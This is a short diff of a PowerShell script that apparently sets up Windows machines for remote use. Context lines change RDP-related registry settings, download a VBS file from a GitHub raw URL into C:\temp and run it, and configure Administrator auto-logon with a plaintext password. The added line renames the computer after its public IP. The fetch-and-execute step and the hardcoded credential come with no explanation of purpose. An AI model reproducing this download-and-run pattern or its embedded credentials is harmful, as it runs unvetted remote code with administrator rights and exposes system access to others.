@@ -12,7 +12,7 @@ Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\W
 sleep 10;
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$url = "https://raw.githubusercontent.com/jokermakelove/unzip/main/a.vbs";$response = Invoke-WebRequest -Uri $url;$code = $response.Content;$filepath = "C:\temp\a.vbs";Set-Content -Path $filepath -Value $code;Start-Process -FilePath $filepath;
 sleep 10;
-
+$ip = ((Invoke-WebRequest 'ip.bablosoft.com').Content).Replace('.','-');Rename-Computer -NewName $ip;
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 $DefaultUsername = "Administrator"
 $DefaultPassword = "Nancyhd1@"
